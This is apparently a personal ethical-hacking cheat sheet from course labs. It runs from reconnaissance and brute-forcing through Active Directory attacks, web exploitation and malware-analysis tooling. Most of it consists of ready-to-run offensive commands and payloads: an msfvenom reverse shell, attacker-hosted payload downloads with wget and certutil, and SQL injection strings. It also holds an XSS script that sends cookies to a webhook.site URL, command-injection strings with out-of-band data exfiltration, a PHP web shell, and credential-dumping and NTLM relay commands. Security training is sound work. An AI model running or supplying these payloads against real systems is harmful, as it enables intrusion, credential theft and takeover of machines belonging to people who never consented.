#### Virtual Box
Set VM internet:
- **Bridge** -->  conn a internet   (selezioni il ponte in base a se sei conn al wifi o ethern)
- **Nat** -->  conn a internet + conn tra diverse vm
            (click also Advanced > Promiscous mode: Allow All)

Per Nat:
devi creare una NatNetwork =>       - File > Tools > Network Manager
						     - seleziona Nat Networks
						     - Create

#### VM Ware 
How to install on ubuntu:
- go [here](https://www.vmware.com/products/workstation-player.html)
- download the .bundle file
- type `sudo bash VMware-Player.bundle`
- finish

##### Install VMWare Tools in ubuntu
follow [[Notes_ETH#Install VM Tools (guest addition)|these steps]]

-------
## Linux

`sudo -l`
 tells you which command you can execute as root without inserting the root password

`locate file.txt`
useful to find where a file/program is located   (to update the file type -->  `sudo updatedb`)

`which ls`
find where a tool is installed (also check if it's installed)

-------
## Tools
### Information Gathering
#### Netdiscover
tools for scanning the entire net to find hosts ip (using arp)
`sudo netdiscover -r 10.0.2.0/24`           -r = scan a given range instead of     
                                    auto scan

----
#### Nmap
tools for scanning ports to identify open ports
`nmap -T4 -p- -A 10.0.2.152`
`nmap -Pn --script smb-vuln* -p 139,445 10.0.2.152`

`-T4` —> set scan velocity from 1 to 5 (1 slow but complete - 5 fast but)
`-p-` —> scan all ports (without scann only 1000 most known) 
`-A` —> show me all that you found
`-Pn` --> treat all hosts as online -- skip host discovery

##### dnsrecon
tools for gathering DNS information
`dnsrecon -r 127.0.0.1/24 -n 10.0.2.154 -d blabla`
`-r `--> range (here we are scanning local host)
`-n` --> NS (victim ip that exposes dns)
`-d `--> domain (can write whatever you want but it's MANDATORY)

-----

### Enumerating 
#### Enumerating HTTP and HTTPS

##### Assetfinder
most recent and fast tool for searching subdomain
it not only finds subdomain -->  but also domain related to the domain that you gave to it
`assetfinder domain`
`assetfinder --subs-only domain`   only search subdomain
best approach:
run the tool as default and then check only the subdomains

##### Amas
tools for finding subdomain
`amas enum -d tesla.com`

##### httprobe
tools that takes a list of domains and probe for working http and https servers
`cat folders/list_domains.txt | httprobe`
`-c int` -->  set the concurrency level (default 20)
`-p value` -->  add additional probe (proto:port)
`-s` -->  skip the default probes (http:80 and https:443)
`-t int` -->  timeout (milliseconds) (default 10000)
`-v` -->  output errors to stderr

<span style="background:#fff88f">if you want to list all the domains that replied without the https:// and :443 in the output:</span>
`cat list_domains.txt | httprobe -s -p https:443 | sed 's/https\?:\/\///' | tr -d ':443' >> alive.txt`
![[Pasted image 20240305184735.png]]

>[!warning] After you run httprobe
> always check for juicy subdomain:
> `cat alive.txt | grep dev`
> `cat alive.txt | grep test`
> `cat alive.txt | grep admin`

##### GoWitness
this tool takes screenshot of a website
scenario -->  you have done subdomain hunting + check subdomains alive with httprobe
=>
GoWitness -->  automates the process of opening each subdomains (without having to do it                                                                                                                                manually)
to do a single screenshot:
`gowitness single https://tesla.com`    in your current directory you'll find a screenshot folder

##### Nikto
scanning website vulnerabilities
`nikto -h http://10.0.2.152`      -h = host

##### Dirbuster
finds hidden file/subdirectories website
`dirbuster`
![[Pasted image 20240214122906.png]]
- Faremo una scansione usando una wordlist predefinita di dirbuster 
- La wordlist —> contiene tanti subdomains noti (es /admin, /root, /…)
- Proverà per ciascuno di essi a vedere se esiste: es [http://10.0.2.152/admin](http://10.0.2.152/admin) e così via

- L’estensione serve a specificare quali tipologie di subdomain deve cercare
- mettendo solo php ⇒ cercherà l’esistenza di tutte le directory nella wordlist add il .php alla fine es [http://192.168.5.5/admin.php](http://192.168.5.5/admin.php)

Altre possibili estensioni —> pdf, rar, zip, docx … (+ ne metti e + è lunga la scans)

- Clicca su Tree View per vedere la struttura ad albero dei file trovati. 
- Se clicchi con il tasto dx su un file e apri nel browser ti mostrerà la pagina
![[Pasted image 20240214123126.png]]

##### dirb
finds hidden file/subdirectories website
`dirb http://10.0.2.152`
> [!INFO] 
> For each subdomains it finds =>  check inside that subdomains if there are others  
> =>
> is **<span style="color:#ff0000">recursive</span>** => can <span style="color:#ff0000">be slow</span>

##### ffuf
finds hidden file/subdirectories website
`sudo apt install ffuf`
`ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ_VARIABLE -u http://10.0.2.152/FUZZ_VARIABLE`
for each word inside the wordlist => try to find if it exists the webiste + word
> [!INFO] 
> by default it's not recursive
> =>
> Check only one deep layer => <span style="color:#00b050">faster</span>

###### Bruteforcing login
- Setup initial things for BurpSuite -->  [[cheat#Initial things to do]]
- send some random credentials
- open the req into Burp > Copy it > Save it inside a txt file
- change the password value as -->  your fuzz variable
- we need a not huge wordlist:
  =>
  `git clone --depth 1 \
  https://github.com/danielmiessler/SecLists.git`
- `ffuf -request req.txt -request-proto http -w /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt`
- We need to filter the result
  =>
  check the Size in the output of ffuf and:
  `ffuf -request req.txt -request-proto http -w /home/simone/Desktop/TCM/wordlist/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -fs <Size_number>`

###### Bruteforcing login CLUSTERBOMB
- do the same step as before
- when you copy the request also -->  copy the Length of the response
- modify the req with -->  `username=FUZZUSER`  and  `password = FUZZPASS`
- create a file with list of password
=>
`ffuf -request req.txt -request-proto http -mode clusterbomb -w passwords.txt:FUZZPASS -w /home/simone/Desktop/TCM/wordlist/SecLists/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376`     
`-mode clusterbomb` -->  for each username it tries everypassword
`-fs 3376` -->  length of the response that we captured
=>
now in the output find an attempts that have a different size value as what we specified
-----
#### Enumerating SMB
##### Metasploit
If you don't know a lot of a protocol =>  search for it inside metasploit to see the modul
`search smb`
`use 0`
`info`
`options`
`set RHOSTS ...`
`run`

##### Smbclient
tries to connect anonimmously to smb file sharing
`smbclient -L \\\\\\\\10.0.2.152\\\\`                 (-L list)

> [!WARNING] Se da questo errore
> `protocol negotiation failed: NT_STATUS_IO_TIMEOUT`
> ⇒  modifica il file `/etc/samba/smb.conf` 
> Aggiungendo sotto “global”:
> `client min protocol = CORE` 
> `client max protocol = SMB3`

![[Pasted image 20240214124007.png]]

Try to connect to ADMIN$:
`smbclient -L \\\\\\\\10.0.2.152\\\\ADMIN$`
leave password empty

---
#### Enumerating DNS
##### dnsrecon
ss

----
### Hash
#### Hash-identifier
check if the string that you have is an hash and what type
`hash-identifier`
`paste hash`

#### hashcat
useful for cracking hash using wordlist         [[cheat#Locate]]
`locate wordlist.txt`
`hashcat -m 0 file_contains_hash.txt /path/wordlist.txt`
`-m 0` -->  use module 0 => crack md5

if you need to use a module that you don't know:
`hashcast --help | grep protocol`
and look for module number for the protocol that you need

if you are decrypting multiple hashes
=>
after hashcat finish -->  retype the command with `--show`
`hashcat -m 0 file_with_hash.txt /path/wordlist.txt --show` -->  this will print only the pwds


> [!WARNING] 
> hashcat is heavy on GPU => it's bettere to avoid it inside a VM

----
### Crack
#### fcrackzip
cracks password protected zip files with brute force or dictionary based attacks
`fcrackzip -v -u -D -p /wordlist.txt zipName.zip`
`-v` -->  verbose
`-u` -->  unzip
`-D` --> Dictionary attack
`-p` -->  zip that we want to crack



-----
### Privilege Escalation
#### linpeas
automated tool to check if there are some potential priv escal inside the target
[linpeas github](https://github.com/carlospolop/PEASS-ng/releases/tag/20240211-db8c669a)
- Saved it locally inside a folder (+)
- create a server with python to download the script from the victim
- `cd (+)`
- `python3 -m http.server 80`
- from the victim shell:
	- `wget http://IP-ATTACKER/linpeas.sh`
	- `chmod +x linpeas.sh`
	- `./linpeas.sh`

#### winpeas
same as [[cheat#linpeas]] but -->  for windows
=>
automated tool to check if there are some potential priv escal inside the target
- download the .exe from [here](https://github.com/carlospolop/PEASS-ng/releases/tag/20240211-db8c669a)
- Saved it locally inside a folder (+)
- create a server with python to download the script from the victim
- `cd (+)`
- `python3 -m http.server 80`
- from the victim shell:
	- go inside a directory where you can write file
	- Use the correspective wget in windows
	- `certutil.exe -urlcache -f http://10.0.2.15/winpeas.exe winpeas.exe`   
	     (download from the ip winpeas.exe and save it as winpeas.exe)
	- `winpeas.exe`

----
## BurpSuite
[Change display and HTTP dimension](https://forum.portswigger.net/thread/font-size-would-like-to-increase-3fac8746)
### Bruteforcing Login
Set [[cheat#FoxyProxy]]
- Turn on the proxy
- Open Burp
- Go to Proxy 
- Click Intercept On
- Try a login in the website with random credentials
- Burp will intercept the request
	- Right Click on the request > Send to Intruder
	- From Intruder click "Clear"    (to clear the fields)
	- Select the username value in the request and click Add
	- Do the same for the password value
	- Select as Attack Type "Cluster Bomb"
	- Go to "Payloads"
	- Add all the possible usernames
	- Select "Payload Set" to 2 (so to set all the possible passwords)
	- Add all the possible passwords
	- Click Start "Attack"
	- Look for difference inside Status Code and Length
	Example with images -->  [[Notes/TCM/ETH/Capstones/Butler/report#BurpSuite]]

### SQL Injection
#### Initial things to do
- turn on [[cheat#FoxyProxy]]
- click on Target > Scope Settings > Add > `http://domain-you-want-to-hack > Ok > Yes
    ![[Pasted image 20240307120204.png]]
- go to Proxy > HTTP history > right click on one of them > Clear History
  =>
  in this way if you search for something in google =>  it won't appear in the histo
#### Repeater
repeater allows you to -->  inject data and modify them
- insert valid data inside the website 
- go to the history and open the POST request
- always look at -->  response length in the Response (`Content-Length`)
- right click inside the request > Send to Repeater > Open the Repeater Section
- try to modify one value to something else > click on Send > <span style="color:#00b050">look at the response length</span>
                                                     if it's different in length
  >[!info] Look visually
  >if you want to look the response visually:
  >=>
  >after the Response click on -->  Render
  >![[Pasted image 20240307123321.png]]

##### Try SQL injection in Repeater
- add to one of the value -->  `' or 1=1#`
- to include it -->  select this text > CTRL+U
- then click on Send 

#### sqlmap 
Automate finding SQL injection vulnerabilities
- copy the clean POST request  (without `' or 1=1#`)
- save it inside a txt file
- run `sqlmap -r req.txt`

if it said "all tested parameters do not appear to be injectable":
=>
What can we do now:
- go back to manual testing
- download a list of payloads and try to fuzz it
- look for other injection points

`sqlmap -r req2.txt --level=2`  -->  for cookies
<span style="background:#fff88f">if you find a payload:</span>
`sqlmap -r req2.txt --level=2 --dump` -->  to try to use the payload against the webserver

[[Notes_ETH#Sqlmap|example here]]


----
### Metasploit
#### Use a module
[[Notes/TCM/ETH/Capstones/Blue/report#Steps automated exploit|Use a module]]

#### Create and rename a shell
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=7777 -f exe -o Wise.exe`
`-p` --> payload
`LHOST `--> attacker ip
`-f` -->  file type of the payload that we want create
`-o` -->  name of the payload

to listen for the reverse shell -->  `nc -nvlp 7777`

#### Pause and Enter in a Session
when you have a shell for example:
by typing `background` -->  you can go back to metasploit
`sessions` -->  you can see the active sessions
`sessions 1` -->  to go back into the session 1

#### Load an extension (es incognito)
once you have a shell for example:
`load incognito`
`options`              (to see all the extension commands)

> [!info] 
>if you only type load and press tab:
>=>
>you can see all the extensions that you can use

----
### Mimikatz
tool used to:
- view and steal credentials   
- dump credentials stored in memory
- generate kerberos tickets
- leverage attacks

attacks that you can perform -->  credential dumping, pass the hash, pass the ticket, silver ticket, 
                             golden ticket, over-pass the hash

to install it:
- search on google -->  [mimikatz gitgub](https://github.com/gentilkiwi/mimikatz)
- go to release
- download the latest mimikatz_trunk.zip
- extract it
- run the x64/mimikatz.exe -->  inside a privileged cmd (`mimikatz.exe`)

#### Install mimikatz on victim machine
<span style="background:#fff88f">to install it on the victim machine:</span>
- repeat all the steps in your attacker machine until extract the file
- cd to the x64 folder
- `python3 -m http.server 80`
- from the victim pc:
	- open the browser and type the attacker IP
	- download all the files in that folder
	- open a privileged CMD > navigate in the Download folder > run `mimikatz.exe`
  

#### Sekurlsa
[[Notes_ETH#sekurlsa|sekurlsa]]



------
### Active Directory
#### Responder
LLMNR/NBT-NS/mDNS Poisoner
(you must be in the folder where you have downloaded Responder)
`sudo python3 Responder.py -I vmnet8 -dPv`
`-I` -->   interface
`-d` -->  enable answers for DHCP broadcast requests (this option injects a WPAD server in the)
                                              DHCP response
`-w` -->  start a WPAD rogue proxy server (that allows a browser to automatically discover proxy)
`-P` -->  force NTLM authentication for the proxy
`-v` -->  verbose

after having found the the hash you can use -->  [[cheat#hashcat|hashcat]] (to decrypt the password)

> [!warning] 
> Need to be on the same network as the victim
> if it doesn't work try without `-P`
> if it fails try to kill apache server (`sudo /etc/init.d/apache2 stop`)

#### Impacket
[[Notes_ETH#Update/install Impacket]]

#### ntlmrelayx.py
Impacket’s ntlmrelayx.py performs NTLM Relay Attacks, creating an SMB and HTTP server and relaying credentials to various different protocols.
`ntlmrelayx.py -tf targets.txt -sm2support` 
`-tf` -->  target file
`targets.txt` -->  contains victim IP

`ntlmrelayx.py -tf targets.txt -sm2support -i`
`-i` -->  interactive mode

`ntlmrelayx.py -tf targets.txt -sm2support -c "whoami"
`-c "command"` -->  execute a command

#### psexec.py
tools for obtaining an interactive shell on windows host
`sudo psexec.py MARVEL/fcastle:'Password1'@172.16.214.130`        DOMAIN/user:'password'@ip

can connect even with an hash:
`sudo psexec.py administrator@172.16.214.130 -hashes hash`

if psexec is not working:
=> you can try to use:
`wmiexec.py`
`smbexec.py`

#### mitm6
mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server. As DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server.

first set up [[cheat#ntlmrelayx.py|ntlmrelayx.py]]:
`ntlmrelayx.py -6 -t ldaps://172.16.214.128 -wh fakewpad.marvel.local -l lootme_folder`
`-6` --> ipv6
`-t` -->  target  (Domain Controller)
`-wh` --> set up a fake wpad 
`-l` -->  create a folder where it saves all the information found

set up mitm6
`sudo mitm6 -d marvel.local`
`-d` -->  domain

now we need an event occur in the network:
for example -->      - reboot THEPUNISHER
                - login inside THEPUNISHER as MARVEL\administrator 

#### ldapdomaindump
tools for active directory enumeration
you need to have an account to gather some information
`mkdir directory_for_saving_information`
`sudo ldapdomaindump ldaps://172.16.214.128 -u 'MARVEL\fcastle' -p Password1 -o directory_for_saving_information`
172.16.214.128 -->  domain controller IP
-u -->  user
-p -->  password
-o -->  directory for saving the information

#### bloodhound
before using this tool -->  you need to setup the neo4j console
=>
##### neo4j
`sudo neo4j console`
> [!warning] if neo4j fails
> list the processes and kill the neo process
> `ps aux | grep java`
> `sudo kill process_number`

![[Pasted image 20240301152033.png]]
you can access the console -->  through http://localhost:7474
for the first time:
- you need to login (username neo4j - password neo4j)
- change the password to -->  neo4j1

=>
now we can run bloodhound:
`sudo bloodhound`
- login with the neo4j credentials
- click on clear database

now we need to collect the data that we need to use inside bloodhound:
- open a new terminal
- `mkdir bloodhound`
- `sudo bloodhound-python -d MARVEL.local -u fcastle -p Password1 -ns 172.16.214.128 -c all`
`-d` --> domain
`-u` --> username
`-p` --> password
`-ns` --> nameserver => Domain Controller IP
`-c all` -->  we collect all

=>
now from the bloodhound interface:
- in the right bar click on -->  upload data
- select all files inside the bloodhound folder

#### plumHound
`cd /opt/PlumHound`
`sudo python3 PlumHound.py -x tasks/default.tasks -p neo4j1`
to use it -->  bloodhound is running
`cd reports`
open the index.html file

#### crackmapexec
`crackmapexec smb 172.16.214.0/24 -u fcastle -d MARVEL.local -p Password1`
we need to specify -->  a network 

> [!info] 
> we can do the same thing with a hash (instead of a password)
> `crackmapexec smb 172.16.214.0/24 -u administrator -H hash --local-auth`

`crackmapexec smb 172.16.214.0/24 -u administrator -H hash --local-auth --shares`
`--shares` -->  enumerates the shares (IPC$ ADMIN$ ...)
`
`crackmapexec smb -L`
list all the module that you can use with this tool
`-M` -->  to use a module

example:
`crackmapexec smb 172.16.214.0/24 -u administrator -H hash --local-auth -M lsassy`

#### secretsdump
tools for looking for hash for accounts
`secretsdump.py MARVEL.local/fcastle:'Password1'@172.16.214.130`

dumping the NTDS.dit:   (that contains all the hashes)
`secretsdump.py MARVEL.local/hawkeye:'Password1@'@172.16.214.128 -just-dc-ntlm`
`172.16.214.128` -->  Domain Controller IP
you must have access an admin account

####  GetUserSPNs
Can be used to obtain a password hash for user accounts that have an SPN (service principal name)
Look [[Notes_ETH#Kerberoasting|here]] to deply understand 
(Domain Controller must be on)
`sudo GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 172.16.214.120 -request`
`-dc-ip` --> Domain Controller IP

-----
## Sites
### GTFOBins 
curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems
[GTFOBins](https://gtfobins.github.io/)

### Payload All The Things
A list of useful payloads and bypasses for Web Application Security
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master)
example of use here -->  [[Notes_ETH#Popup a shell|Popup a shell]]
### Webhook.site
it gives you an unique website URL -->  that you can make calls to
[Webhook](https.//webhook.site)

### AppSecExplained
up-to-date handbook for Web Application Hacking
[AppSecExplained](https://appsecexplained.gitbook.io/appsecexplained/)

----
## Browser Extensions
#### FoxyProxy 
Useful for settings Browser for using BurpSuite

add the firefox [extension](https://addons.mozilla.org/nl/firefox/addon/foxyproxy-basic/)
Go to the Settings > Add Proxy
Set the proxy in this way:
![[Pasted image 20240215140635.png]]

#### Firefox Multi-Account Containers
setup a container for testing -->  this allow us to:
							- have multiple sessions open
							- test across different users
useful example for -->  [[Notes_ETH#Stored XSS 0x01|Stored XSS]]

- search on firefox -->  [Firefox Multi-Account Containers](https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/)
- install it and open it
- click on Manage Container > click on Personal > Modify the name to `Container 1`
- modify the 2 one to `Container 2`
- delete the others


-----
## File transfers
Usually as attacker we -->  host files
### Host a file 
navigate to the directory where you have your files that you want to be hosted:
`python3 -m http.server 80`
or
`python3 -m pyftpdlib 21`

### Retrieve a file
#### Windows
`certutil.exe -urlcache -f http://10.10.10.10/file filename_for_download`
#### Linux
`wget http://10.10.10.10/file`


<span style="background:#fff88f">If `certutil` and `wget` are not working:</span>
`python3 -m pyftpdlib 21`   -->  from the attacker
`ftp 10.10.10.10`                  -->  from the victim

### Metasploit
if you have a meterpreter shell -->  you can use the features `upload/download`
                               to download and upload a file

-----
## Web Exploitation
check always the [[cheat#AppSecExplained|App Sec site]] for having a list of what to do during web exploitation
### SQL Injection
[SQL Injection Cheet Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
#### Basic check
- find a value that return something -->  es `jeremy`
- then try to use characters that might trigger an error:
  `jeremy'`
  `jeremy"`
  `'`
  `"`

#### Logical Operators
`jeremy' or 1=1#`
`or 1=1` -->  returns always true
`#` -->  end sql queries   (for mysql you can also use `-- -`)
       => everything after this -->  will be ignored

#### UNION
we can use it to selects other information or info from another table
>[!warning] Constraint
>There is a constraint to use UNION:
> we can only select -->  the same n° of columns as in the original query

=>
`jeremy' union select null#`
`jeremy' union select null,null#`
`jeremy' union select null,null,null#`
if you find something:
=>
`jeremy' union select null,null,version()#` -->  to read the db version

to <span style="color:#00b050">find all the tables </span>that exist in the db:
`jeremy' union select null,null,table_name from information_schema.tables#`

<span style="color:#00b050">get all the columns name</span> that exist in the db:
`jeremy' union select null,null,column_name from information_schema.columns#`

get an <span style="color:#00b050">user password</span>:
`jeremy' union select null,null,password from injection0x01#`

>[!warning] Constraint
>sometimes if you use something like this:
>`jeremy' union select null,null,...`
>
>and the values in the null columns are not a string => you will get an error
>=>
>try to use different things:
>for example:
>- null(int)
>- 1

#### Tool
[[cheat#sqlmap|sqlmap]]

### XSS
Cross Site Scripting (XSS) -->  let us execute JavaScript in a victim browser
3 types:
- <span style="color:#00b050">reflected</span>:
  the <span style="color:#6666ff">script</span> that you're trying to inject -->  <span style="color:#6666ff">comes from the current HTTP req</span>
  =>
  - you send a request
  - you receive a response
  =>  the malicious script is included -->  in the response
  
  you can only target yourself unless:
  - the <span style="color:#6666ff">payload</span> is inside -->  the <span style="color:#6666ff">URI</span>
  - you <span style="color:#6666ff">entice</span> a user -->  to click on the link                        (enitce = attract)

- <span style="color:#00b050">stored</span>:
  more powerful
	-  <span style="color:#6666ff">payload</span> is stored in something like a -->   <span style="color:#6666ff">DB</span>
	- payload can be <span style="color:#6666ff">retrieved</span> <span style="color:#6666ff">later</span>
    =>
    it allows to <span style="color:#6666ff">attack</span><span style="color:#6666ff"> other users</span>
    
- <span style="color:#00b050">DOM-based:</span>
	- <span style="color:#6666ff">client</span> side has some -->  <span style="color:#6666ff">vulnerable JS</span>
	- this vulnerable JS uses -->      - <span style="color:#6666ff">untrusted inputs</span>
	                            - instead of having a vulnerability server side

#### Check if page is XSS vulnerable
- open the page
- open the console -->  `CTRL+shif+C`
- try:
	- `alert(1)`
	- `print()`
	- `prompt('hello')`

when you are testing for XSS:
you can first check for -->  HTML injection
=>
- `<h1> test </h1>`

#### Basic XSS
`<img src=x onerror="prompt(1)">`
document tries to load x =>    - it will throw an error
                         - on the error we can execute come JS
if it works =>
try to redirect the user:
 `<img src=x onerror="window.location.href='https://google.com'">`

##### Get cookie
`<script> alert(document.cookie)</script>`

##### Exfiltrate Cookies
- open [[cheat#Webhook.site|WebHook website]]
- copy the unique URL
- at the end of it -->  `/?`
- type in the vulnerable input
  `<script> var i = new Image; i.src="https://webhook.site/a67abe7f-f8f9-44af-bf90-6f29be6fd833/?"+document.cookie; </script>`
- refresh the vuln page
- <span style="color:#00b050">we got the cookie</span> 
  ![[Pasted image 20240308113410.png]]

### Command Injection
<span style="background:#fff88f">serious vuln:</span>
bc if you find it => you can:
                  - <span style="color:#00b050">compromise the entire app</span>
                  - <span style="color:#00b050">compromise the host</span> 
how it works:
- the app takes an input from the user
- pass that into a -->  function 
- the function --> executes it as code

#### Website
[[cheat#AppSecExplained]]
#### Basic command injection
`; ls -la`
`&& ls -la`
`; ls -la #`
`| ls -la`
```bash
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

```bash
& nslookup webhook.site/<id>?`whoami` &     -->  out of band testing
```

>[!tips]
>if you have a bad formatted output
>=>
>press `CTRL+U` in the page to see -->  the source code
>=>
>to see also better -->  the output

#### Payload
[[cheat#Payload All The Things]]

>[!tips] Best Practice
>- use the full path for binaries  (ex `/bin/sh`)
>- use a different port (not 4444) -->  bc something fails
>	- try common port -->  80/8080/443

#### Trigger new line
`python3 -m http.server 8080` -->  setup a web server from the attacker
`https://google.com \n wget 172.17.0.1:8080/test`  -->  try to trigger a new line and retrieve 
                                                   something from the webserver

### Insecure file upload
#### Bypass files check (that is only client side)
[[Notes_ETH#Basic Bypass 0x01]]

##### Send a PHP shell
`<?php system($_GET['cmd']); ?>`
`$_GET` -->  this is going to get the value of the parameter inside the `[]` and send a GET request
`system()` -->  function that executes what it has inside

also:
we need to change the file type of our new req:
`cmd.php` -->  bc the file that we want to upload must be executable
![[Pasted image 20240309104930.png]]

###### Find the PHP Shell location
<span style="background:#fff88f">we need to find where this file is been uploaded</span>
=>
we can do:
-  <span style="color:#00b050">guessing</span>
   you can inspect the code to see where the other img in the webserver are stored
-  <span style="color:#00b050">directory busting</span> (ex [[cheat#dirb]])
   `dirb  http://localhost/`

### Attacking authentication

### XXE - External Entities Injection
abuse input that accept XML files to exploit the webpage
to craft a payload look at -->  [[cheat#Payload All The Things]]

### IDOR - Insecure Direct Object Reference
IDOR -->  Insicure Direct Object Reference
it's:
an <span style="color:#00b050">access control issue</span> where:
- we can request a resource with an obj ID
- server will return some info of the obj

<span style="background:#fff88f">easiest way to test IDOR:</span>
find a way where you are able to -->  manipulate an obj ID

------
## Malware Analysis
### Installing FLARE-VM
collection of software installations scripts for Windows systems that allows you to easily setup and maintain a reverse engineering environment on a virtual machine (VM)

How to install it:
look [[Notes_PMAT#Installing FLARE-VM|here]]

------
### Practice
#### Find SHA256sum and MD5sum
`sha256sum.exe Malware.Unknown.exe.malz`
`md5sum.exe Malware.Unknown.exe.malz`


---
### Tools

#### INetSim
software suite for simulating common internet services in a lab environment
example -->  for analyzing the network behaviour of unknown malware samples
[[Notes_PMAT#INetSim Setup (REMnux)|example how to use it]]
#### FLOSS
tools for extracting Strings from binary
it also tries to -->    - decode
                 - de-obfuscate  the strings
                   
`FLOSS.exe Malware.Unknown.exe.malz` -->  it will print any strings that has at least 4 characters
`FLOSS.exe -n 6 Malware.Unknown.exe.malz` -->  to print only strings with >= 6 ch

#### PEview
tools for basic initial static malware analysis 
[[Notes_PMAT#Peview|how to use it]]

#### PEstudio
tools that automate all the info that you can find manually with PEview
[[Notes_PMAT#!! PEStudio !!|how to use it]]

#### Capa
program that <span style="color:#00b050">detects malicious capabilities</span> in suspicious programs <span style="color:#00b050">by using a set of rules</span>
These <span style="color:#00b050">rules</span>:
are meant to be -->  as <span style="color:#00b050">high-level and human readable</span> as possible
=>
<span style="color:#00b050">It translates</span> -->  the technical info in a binary into a simple, human-readable piece of info

`capa.exe Malware.Unknown.exe.malz`
`capa.exe Malware.Unknown.exe.malz -v` -->  for more info

### Procmon
advanced monitoring tool for Windows that shows:
- real-time file system
- registry
- process/thread activity

### TCPView
Windows program that will show you detailed listings of all TCP and UDP endpoints on your system, including the local and remote addresses and state of TCP connections.

### Cutter
 multi-platform reverse engineering tool

-----
### Sites
#### VIRUSTOTAL
[virustotal](https://www.virustotal.com/gui/)
gigantic repository of lots of different info about malware samples
=>
you can use it to ask him if it has ever seen our malware
=>
- click on search and paste the [[cheat#Find SHA256sum and MD5sum|sha256sum or md5sum]]  (without the name of the malware)

#### MAlAPI.io
- it catalogs Windows API -->  that can be user maliciously
- it identifies sample of malwares that -->  those APIs are used maliciously in

